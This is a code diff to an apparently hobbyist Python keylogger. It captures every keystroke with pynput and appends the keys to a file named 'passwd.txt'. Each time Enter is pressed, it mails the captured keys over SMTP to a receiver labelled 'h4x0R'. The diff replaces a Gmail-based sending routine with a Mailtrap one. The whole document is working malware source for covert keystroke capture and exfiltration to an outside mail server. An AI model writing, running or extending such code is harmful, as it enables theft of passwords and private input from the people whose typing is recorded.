@@ -2,22 +2,26 @@ import pynput
 from pynput.keyboard import Key, Listener
 import smtplib
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "exampleOfMail@gmail.com"
-EMAIL_PASSWORD = "exampleOfPasswd"
+
+sender = "TKlogg Prey"
+receiver = "h4x0R"
 keys = []
 
+message = f"""\
+Subject: Hi Mailtrap
+To: {receiver}
+From: {sender}
+
+."""
 
 def writeFile(key):
     with open("passwd.txt", "a") as save:
             save.write(str(key))
 
-def sendMail(email, password, message):
-    server = smtplib.SMTP(host="smtp.gmail.com", port = 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+def sendMail():
+    server = smtplib.SMTP("smtp.mailtrap.io", 2525)
+    server.login("mail", "pass")
+    server.sendmail(sender, receiver, message + str(keys))
 
 def onPress(key):
     global keys
@@ -25,7 +29,7 @@ def onPress(key):
     print(key)
     if key == Key.enter:
         writeFile(keys)
-        sendMail(EMAIL_PASSWORD, EMAIL_PASSWORD, keys)
+        sendMail()
         keys = []
         
 def onRelease(key):
